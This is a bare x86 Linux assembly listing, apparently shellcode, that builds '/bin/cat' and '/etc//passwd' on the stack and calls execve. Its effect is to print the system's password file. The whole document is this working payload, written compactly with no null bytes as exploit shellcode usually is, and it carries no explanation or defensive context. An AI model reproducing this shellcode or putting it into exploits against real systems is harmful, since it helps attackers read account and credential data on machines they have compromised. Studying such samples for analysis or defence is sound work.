
global _start
section .text
_start:
        xor eax, eax
        cdq
        push edx
        push dword 0x7461632f   ; tac/
        push dword 0x6e69622f   ; nib/
        mov ebx, esp
        push edx
        push dword 0x64777373   ; dwss
        push dword 0x61702f2f   ; ap//
        push dword 0x6374652f   ; cte/
        mov ecx, esp
        mov al, 0xb
        push edx
        push ecx
        push ebx
        mov ecx, esp
        int 0x80

